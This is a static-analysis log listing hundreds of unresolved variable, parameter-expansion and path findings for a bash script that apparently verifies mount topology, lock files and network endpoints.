UNRESOLVED line=474 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=path="$2"
UNRESOLVED line=474 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${3:-path_not_evaluable} expression=unreadable="${3:-path_not_evaluable}"
UNRESOLVED line=475 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_PATH_FIELD expression=path_field="$WPI_PATH_FIELD"
UNRESOLVED line=492 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=raw="$WPI_LINE"
UNRESOLVED line=494 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${raw#*|} expression=rest="${raw#*|}"
UNRESOLVED line=494 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${raw%%|*} expression=WPI_META_KIND="${raw%%|*}"
UNRESOLVED line=495 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*|} expression=rest="${rest#*|}"
UNRESOLVED line=495 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%|*} expression=WPI_META_MODE="${rest%%|*}"
UNRESOLVED line=496 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*|} expression=rest="${rest#*|}"
UNRESOLVED line=496 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%|*} expression=WPI_META_OWNER="${rest%%|*}"
UNRESOLVED line=497 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*|} expression=WPI_META_SIZE="${rest#*|}"
UNRESOLVED line=497 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%|*} expression=WPI_META_ID="${rest%%|*}"
UNRESOLVED line=515 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=outcome="$1"
UNRESOLVED line=515 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=prefix="$2"
UNRESOLVED line=515 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=message="$3"
UNRESOLVED line=528 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=528 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=path="$2"
UNRESOLVED line=528 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=leaf_kind="$3"
UNRESOLVED line=528 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $4 expression=leaf_mode="$4"
UNRESOLVED line=528 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $5 expression=leaf_owner="$5"
UNRESOLVED line=529 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${6:-path_absent} expression=leaf_absent_reason="${6:-path_absent}"
UNRESOLVED line=529 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${7:-path_metadata_mismatch} expression=leaf_object_reason="${7:-path_metadata_mismatch}"
UNRESOLVED line=530 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${8:-fail} expression=outcome="${8:-fail}"
UNRESOLVED line=530 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${9:-path_binding_not_evaluable} expression=stop_context="${9:-path_binding_not_evaluable}"
UNRESOLVED line=531 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${10:-path_not_evaluable} expression=unreadable="${10:-path_not_evaluable}"
UNRESOLVED line=531 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${11:-} expression=leaf_owner_reason="${11:-}"
UNRESOLVED line=531 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${12:-with_path} expression=leaf_field_style="${12:-with_path}"
UNRESOLVED line=534 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_PATH_FIELD expression=walk_path_field="$WPI_PATH_FIELD"
UNRESOLVED line=541 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${path#/} expression=rest="${path#/}"
UNRESOLVED line=547 kind=coverage reason=assignment value is not statically known: loop variable component is dynamic expression=current="$current/$component"
UNRESOLVED line=550 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=expected_kind="$leaf_kind"
UNRESOLVED line=550 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $5 expression=expected_owner="$leaf_owner"
UNRESOLVED line=551 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${leaf_mode#0} expression=expected_mode="${leaf_mode#0}"
UNRESOLVED line=554 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_PATH_FIELD expression=leaf_fields=" $WPI_PATH_FIELD"
UNRESOLVED line=561 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=kind_token="$WPI_LINE"
UNRESOLVED line=576 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${9:-path_binding_not_evaluable} expression=deviation_reason="$stop_context detail=path_metadata_mismatch"
UNRESOLVED line=582 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${9:-path_binding_not_evaluable} expression=deviation_reason="$stop_context detail=path_metadata_mismatch"
UNRESOLVED line=591 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=file="$1"
UNRESOLVED line=593 kind=coverage reason=array assignment is outside the accepted scalar subset expression=WPI_MI_DEVICE=(...)
UNRESOLVED line=593 kind=coverage reason=array assignment is outside the accepted scalar subset expression=WPI_MI_FSTYPE=(...)
UNRESOLVED line=593 kind=coverage reason=array assignment is outside the accepted scalar subset expression=WPI_MI_POINT=(...)
UNRESOLVED line=593 kind=coverage reason=array assignment is outside the accepted scalar subset expression=WPI_MI_ROOT=(...)
UNRESOLVED line=593 kind=coverage reason=array assignment is outside the accepted scalar subset expression=WPI_MI_SOURCE=(...)
UNRESOLVED line=594 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_READ_DIAG expression=diag="$WPI_READ_DIAG"
UNRESOLVED line=594 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_READ_DIAG_FD expression=dfd="$WPI_READ_DIAG_FD"
UNRESOLVED line=595 kind=unresolved_path reason=dynamic shell parameter $1 expression="$file"
UNRESOLVED line=597 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=597 kind=coverage reason=read option value is not statically known: declared variable fd has no static value expression="$fd"
UNRESOLVED line=597 kind=unresolved_path reason=unpinned variable WPI_READ_DIAG_FD expression="$dfd"
UNRESOLVED line=605 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${line#* - } expression=post="${line#* - }"
UNRESOLVED line=605 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${line%% - *} expression=pre="${line%% - *}"
UNRESOLVED line=611 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=seen_ids="$seen_ids$1 "
UNRESOLVED line=614 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=device="$3"
UNRESOLVED line=614 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $4 expression=root="$4"
UNRESOLVED line=614 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $5 expression=mount_point="$5"
UNRESOLVED line=617 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=fstype="$1"
UNRESOLVED line=617 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=source="$2"
UNRESOLVED line=619 kind=coverage reason=compound assignment is outside the accepted scalar subset expression=WPI_MI_DEVICE+=
UNRESOLVED line=619 kind=coverage reason=compound assignment is outside the accepted scalar subset expression=WPI_MI_POINT+=
UNRESOLVED line=619 kind=coverage reason=compound assignment is outside the accepted scalar subset expression=WPI_MI_ROOT+=
UNRESOLVED line=619 kind=coverage reason=dynamic command name: dynamic shell parameter $3 expression="$device"
UNRESOLVED line=619 kind=coverage reason=dynamic command name: dynamic shell parameter $4 expression="$root"
UNRESOLVED line=619 kind=coverage reason=dynamic command name: dynamic shell parameter $5 expression="$mount_point"
UNRESOLVED line=620 kind=coverage reason=compound assignment is outside the accepted scalar subset expression=WPI_MI_FSTYPE+=
UNRESOLVED line=620 kind=coverage reason=compound assignment is outside the accepted scalar subset expression=WPI_MI_SOURCE+=
UNRESOLVED line=620 kind=coverage reason=dynamic command name: dynamic shell parameter $1 expression="$fstype"
UNRESOLVED line=620 kind=coverage reason=dynamic command name: dynamic shell parameter $2 expression="$source"
UNRESOLVED line=621 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=records=$(( records + 1 ))
UNRESOLVED line=629 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=WPI_MOUNT_SNAPSHOT_SEQ=$(( WPI_MOUNT_SNAPSHOT_SEQ + 1 ))
UNRESOLVED line=630 kind=coverage reason=assignment value is not statically known: unpinned variable EV_DIR expression=snapshot="$EV_DIR/ro.mountinfo.$(printf '%04d' "$WPI_MOUNT_SNAPSHOT_SEQ").snapshot"
UNRESOLVED line=631 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LEAF_FD expression=outfd="$WPI_LEAF_FD"
UNRESOLVED line=632 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_READ_DIAG expression=diag="$WPI_READ_DIAG"
UNRESOLVED line=632 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_READ_DIAG_FD expression=dfd="$WPI_READ_DIAG_FD"
UNRESOLVED line=635 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=635 kind=coverage reason=read option value is not statically known: declared variable infd has no static value expression="$infd"
UNRESOLVED line=635 kind=unresolved_path reason=unpinned variable WPI_READ_DIAG_FD expression="$dfd"
UNRESOLVED line=642 kind=unresolved_path reason=unpinned variable WPI_LEAF_FD expression="$outfd"
UNRESOLVED line=644 kind=coverage reason=assignment value is not statically known: unpinned variable EV_DIR expression=WPI_LINE="$snapshot"
UNRESOLVED line=660 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=snapshot="$1"
UNRESOLVED line=662 kind=coverage reason=array assignment is outside the accepted scalar subset expression=points=(...)
UNRESOLVED line=671 kind=coverage reason=array assignment is outside the accepted scalar subset expression=root_candidates=(...)
UNRESOLVED line=677 kind=coverage reason=array assignment is outside the accepted scalar subset expression=roots=(...)
UNRESOLVED line=681 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ, this tool does not model which consumer splits it, and an option word carrying an attached pathname is not decomposed expression=seen_roots="$seen_roots$r "
UNRESOLVED line=681 kind=unresolved_path reason=relative path depends on unpinned PWD expression=seen_roots="$seen_roots$r "
UNRESOLVED line=682 kind=coverage reason=compound assignment is outside the accepted scalar subset expression=roots+=
UNRESOLVED line=682 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=685 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=WPI_PROBE_SEQ=$(( WPI_PROBE_SEQ + 1 ))
UNRESOLVED line=686 kind=coverage reason=assignment value is not statically known: unpinned variable EV_DIR expression=projection="$EV_DIR/ro.$(printf '%04d' "$WPI_PROBE_SEQ").mount_projection.tsv"
UNRESOLVED line=687 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LEAF_FD expression=pfd="$WPI_LEAF_FD"
UNRESOLVED line=691 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${WPI_MI_POINT[$i]} expression=mp="${WPI_MI_POINT[$i]}"
UNRESOLVED line=693 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${#mp} expression=len=${#mp}
UNRESOLVED line=696 kind=coverage reason=assignment value is not statically known: declared variable i has no static value expression=best="$i"
UNRESOLVED line=696 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${#mp} expression=best_len="$len"
UNRESOLVED line=703 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=shared=$(( shared + 1 ))
UNRESOLVED line=708 kind=unresolved_path reason=unpinned variable WPI_LEAF_FD expression="$pfd"
UNRESOLVED line=712 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${r%/} expression=rprefix="${r%/}/"
UNRESOLVED line=714 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${WPI_MI_POINT[$i]} expression=mp="${WPI_MI_POINT[$i]}"
UNRESOLVED line=716 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=subtree_records=$(( subtree_records + 1 ))
UNRESOLVED line=720 kind=unresolved_path reason=unpinned variable WPI_LEAF_FD expression="$pfd"
UNRESOLVED line=723 kind=unresolved_path reason=unpinned variable WPI_LEAF_FD expression="$pfd"
UNRESOLVED line=727 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=WPI_MOUNT_PROJECTION_DIGEST="$WPI_LINE"
UNRESOLVED line=733 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=733 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=reason="$2"
UNRESOLVED line=733 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=path="$3"
UNRESOLVED line=734 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=path_field="path=$path"
UNRESOLVED line=739 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=rendered="$WPI_LINE"
UNRESOLVED line=739 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rendered%% *} expression=digest="${rendered%% *}"
UNRESOLVED line=742 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rendered%% *} expression=WPI_LINE="$digest"
UNRESOLVED line=748 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=snapshot="$WPI_LINE"
UNRESOLVED line=750 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=751 kind=coverage reason=opaque command argument: unpinned variable WPI_MOUNT_PROJECTION_DIGEST expression="mount_topology_mismatch observed=$WPI_MOUNT_PROJECTION_DIGEST attested=$WPI_ATTESTED_MOUNTINFO_SHA256 format=normalised_path_projection_v2"
UNRESOLVED line=752 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_MOUNT_PROJECTION_DIGEST expression=WPI_MOUNT_BEFORE="$WPI_MOUNT_PROJECTION_DIGEST"
UNRESOLVED line=757 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_MOUNT_BEFORE expression=before="$WPI_MOUNT_BEFORE"
UNRESOLVED line=759 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=snapshot="$WPI_LINE"
UNRESOLVED line=762 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=763 kind=coverage reason=opaque command argument: unpinned variable WPI_MOUNT_BEFORE expression="mount_topology_changed before=$before after=$WPI_MOUNT_PROJECTION_DIGEST format=normalised_path_projection_v2"
UNRESOLVED line=767 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=name="$1"
UNRESOLVED line=767 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=path="$2"
UNRESOLVED line=769 kind=unresolved_path reason=dynamic shell parameter $2 expression="$path"
UNRESOLVED line=813 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${entry#*=} expression=pin_path="${entry#*=}"
UNRESOLVED line=813 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${entry%%=*} expression=pin_name="${entry%%=*}"
UNRESOLVED line=828 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=pin_count=$(( pin_count + 1 ))
UNRESOLVED line=828 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${entry%%=*} expression=pin_seen="$pin_seen$pin_name "
UNRESOLVED line=832 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=path="$WPI_LINE"
UNRESOLVED line=853 kind=coverage reason=opaque command argument: unpinned variable RUNID expression="$RUNID"
UNRESOLVED line=853 kind=coverage reason=opaque command rp0_require_safe_component has no registered argv grammar expression=rp0_require_safe_component
UNRESOLVED line=854 kind=coverage reason=opaque command argument: unpinned variable EV_STAGE_ID expression="$EV_STAGE_ID"
UNRESOLVED line=854 kind=coverage reason=opaque command rp0_require_safe_component has no registered argv grammar expression=rp0_require_safe_component
UNRESOLVED line=860 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=885 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=rawpath="$WPI_LINE"
UNRESOLVED line=889 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=fdid="$WPI_LINE"
UNRESOLVED line=893 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=logid="$WPI_LINE"
UNRESOLVED line=903 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=903 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=label="$2"
UNRESOLVED line=903 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=root="$3"
UNRESOLVED line=907 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=elapsed_s=$(( WPI_CAP_ELAPSED_MS / 1000 ))
UNRESOLVED line=918 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=root="$1"
UNRESOLVED line=918 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=label="$2"
UNRESOLVED line=923 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=find_elapsed_s=$(( find_elapsed / 1000 ))
UNRESOLVED line=923 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_ELAPSED_MS expression=find_elapsed="$WPI_CAP_ELAPSED_MS"
UNRESOLVED line=923 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_OUT expression=out="$WPI_CAP_OUT"
UNRESOLVED line=924 kind=unresolved_path reason=unpinned variable WPI_CAP_OUT expression="$out"
UNRESOLVED line=925 kind=unresolved_path reason=unpinned variable WPI_CAP_OUT expression="$out"
UNRESOLVED line=926 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_READ_DIAG expression=diag="$WPI_READ_DIAG"
UNRESOLVED line=926 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_READ_DIAG_FD expression=dfd="$WPI_READ_DIAG_FD"
UNRESOLVED line=927 kind=unresolved_path reason=unpinned variable WPI_CAP_OUT expression="$out"
UNRESOLVED line=929 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=929 kind=coverage reason=read option value is not statically known: declared variable fd has no static value expression="$fd"
UNRESOLVED line=929 kind=unresolved_path reason=unpinned variable WPI_READ_DIAG_FD expression="$dfd"
UNRESOLVED line=937 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=writable_count=$(( writable_count + 1 ))
UNRESOLVED line=939 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_PATH_FIELD expression=WPI_FIRST_WRITABLE_FIELD="$WPI_PATH_FIELD"
UNRESOLVED line=952 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=path="$1"
UNRESOLVED line=952 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=owner="$2"
UNRESOLVED line=966 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=prefix="$1"
UNRESOLVED line=966 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=absent_reason="$2"
UNRESOLVED line=966 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=mismatch_reason="$3"
UNRESOLVED line=966 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $4 expression=path="$4"
UNRESOLVED line=966 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $5 expression=bytes="$5"
UNRESOLVED line=966 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $6 expression=digest="$6"
UNRESOLVED line=966 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $7 expression=label="$7"
UNRESOLVED line=966 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${8:-path_metadata_mismatch} expression=object_reason="${8:-path_metadata_mismatch}"
UNRESOLVED line=966 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${9:-with_path} expression=field_style="${9:-with_path}"
UNRESOLVED line=970 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_META_SIZE expression=observed_size="$WPI_META_SIZE"
UNRESOLVED line=972 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=WPI_OBSERVED_DIGEST="$WPI_LINE"
UNRESOLVED line=990 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=resolved="$WPI_LINE"
UNRESOLVED line=1010 kind=unresolved_path reason=unpinned variable WPI_CAP_OUT expression="$WPI_CAP_OUT"
UNRESOLVED line=1011 kind=unresolved_path reason=unpinned variable WPI_CAP_ERR expression="$WPI_CAP_ERR"
UNRESOLVED line=1012 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_OUT expression=version_file="$WPI_CAP_OUT"
UNRESOLVED line=1012 kind=unresolved_path reason=unpinned variable WPI_CAP_ERR expression="$WPI_CAP_ERR"
UNRESOLVED line=1012 kind=unresolved_path reason=unpinned variable WPI_CAP_OUT expression="$WPI_CAP_OUT"
UNRESOLVED line=1013 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_ERR expression=version_file="$WPI_CAP_ERR"
UNRESOLVED line=1013 kind=unresolved_path reason=unpinned variable WPI_CAP_ERR expression="$WPI_CAP_ERR"
UNRESOLVED line=1013 kind=unresolved_path reason=unpinned variable WPI_CAP_OUT expression="$WPI_CAP_OUT"
UNRESOLVED line=1041 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_OUT expression=out="$WPI_CAP_OUT"
UNRESOLVED line=1042 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_READ_DIAG expression=diag="$WPI_READ_DIAG"
UNRESOLVED line=1042 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_READ_DIAG_FD expression=dfd="$WPI_READ_DIAG_FD"
UNRESOLVED line=1043 kind=unresolved_path reason=unpinned variable WPI_CAP_OUT expression="$out"
UNRESOLVED line=1045 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=1045 kind=coverage reason=read option value is not statically known: declared variable fd has no static value expression="$fd"
UNRESOLVED line=1045 kind=unresolved_path reason=unpinned variable WPI_READ_DIAG_FD expression="$dfd"
UNRESOLVED line=1052 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=entries=$(( entries + 1 ))
UNRESOLVED line=1054 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${path##*/} expression=base="${path##*/}"
UNRESOLVED line=1065 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=ignored=$(( ignored + 1 ))
UNRESOLVED line=1074 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=count=$(( count + 1 ))
UNRESOLVED line=1085 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=WPI_MEMBER_DIGEST="$WPI_LINE"
UNRESOLVED line=1099 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=value="$1"
UNRESOLVED line=1105 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=line="$1"
UNRESOLVED line=1106 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${line#verify_lock: FAIL: } expression=detail="${line#verify_lock: FAIL: }"
UNRESOLVED line=1109 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${detail#missing-or-wrong=} expression=missing="${detail#missing-or-wrong=}"
UNRESOLVED line=1109 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${missing%%; unexpected=*} expression=missing="${missing%%; unexpected=*}"
UNRESOLVED line=1110 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${detail#*; unexpected=} expression=extras="${detail#*; unexpected=}"
UNRESOLVED line=1113 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${detail#missing-or-wrong=} expression=missing="${detail#missing-or-wrong=}"
UNRESOLVED line=1116 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${detail#unexpected=} expression=extras="${detail#unexpected=}"
UNRESOLVED line=1221 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=err="$WPI_LINE"
UNRESOLVED line=1227 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${err#verify_lock_driver: universe_unexpected } expression=fields="${err#verify_lock_driver: universe_unexpected }"
UNRESOLVED line=1228 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${fields#* } expression=udigest="${fields#* }"
UNRESOLVED line=1228 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${fields%% *} expression=ufmt="${fields%% *}"
UNRESOLVED line=1240 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${err#verify_lock_driver: distribution_identity_unestablished } expression=fields="${err#verify_lock_driver: distribution_identity_unestablished }"
UNRESOLVED line=1241 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${fields#* } expression=udigest="${fields#* }"
UNRESOLVED line=1241 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${fields%% *} expression=ufmt="${fields%% *}"
UNRESOLVED line=1264 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_MAINPID expression=service_path="/proc/$WPI_MAINPID/ns/net"
UNRESOLVED line=1269 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=caller="$WPI_LINE"
UNRESOLVED line=1274 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=service="$WPI_LINE"
UNRESOLVED line=1293 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=rest="$1"
UNRESOLVED line=1296 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*.} expression=o="$rest"
UNRESOLVED line=1296 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*.} expression=rest="${rest#*.}"
UNRESOLVED line=1296 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%.*} expression=o="${rest%%.*}"
UNRESOLVED line=1297 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=n=$(( n + 1 ))
UNRESOLVED line=1310 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=rest="$1"
UNRESOLVED line=1314 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*:} expression=piece="$rest"
UNRESOLVED line=1314 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*:} expression=rest="${rest#*:}"
UNRESOLVED line=1314 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%:*} expression=piece="${rest%%:*}"
UNRESOLVED line=1317 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=n=$(( n + 2 ))
UNRESOLVED line=1320 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=n=$(( n + 1 ))
UNRESOLVED line=1325 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=WPI_LINE="$n"
UNRESOLVED line=1331 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=s="$1"
UNRESOLVED line=1333 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${s##*%} expression=zone="${s##*%}"
UNRESOLVED line=1333 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${s%%%*} expression=s="${s%%%*}"
UNRESOLVED line=1342 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${s#*::} expression=tail="${s#*::}"
UNRESOLVED line=1342 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${s%%::*} expression=head="${s%%::*}"
UNRESOLVED line=1343 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_LINE expression=hn="$WPI_LINE"
UNRESOLVED line=1361 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=token="$1"
UNRESOLVED line=1361 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=role="$2"
UNRESOLVED line=1363 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${token##*:} expression=port="${token##*:}"
UNRESOLVED line=1363 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${token%:*} expression=addr="${token%:*}"
UNRESOLVED line=1375 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${addr#[} expression=inner="${addr#[}"
UNRESOLVED line=1375 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${inner%]} expression=inner="${inner%]}"
UNRESOLVED line=1380 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${token##*:} expression=WPI_EP_PORT="$port"
UNRESOLVED line=1380 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${token%:*} expression=WPI_EP_ADDR="$addr"
UNRESOLVED line=1391 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_READ_DIAG expression=diag="$WPI_READ_DIAG"
UNRESOLVED line=1391 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_READ_DIAG_FD expression=dfd="$WPI_READ_DIAG_FD"
UNRESOLVED line=1424 kind=coverage reason=assignment value is not statically known: unpinned variable WPI_CAP_OUT_FD expression=fd="$WPI_CAP_OUT_FD"
UNRESOLVED line=1426 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=1426 kind=coverage reason=read option value is not statically known: unpinned variable WPI_CAP_OUT_FD expression="$fd"
UNRESOLVED line=1426 kind=unresolved_path reason=unpinned variable WPI_READ_DIAG_FD expression="$dfd"
UNRESOLVED line=1434 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*$'\n'} expression=rest="${rest#*$'\n'}"
UNRESOLVED line=1434 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%$'\n'*} expression=line="${rest%%$'\n'*}"
UNRESOLVED line=1437 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=consumed=$(( consumed + ${#line} + 1 ))
UNRESOLVED line=1442 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=state="$1"
UNRESOLVED line=1442 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=recvq="$2"
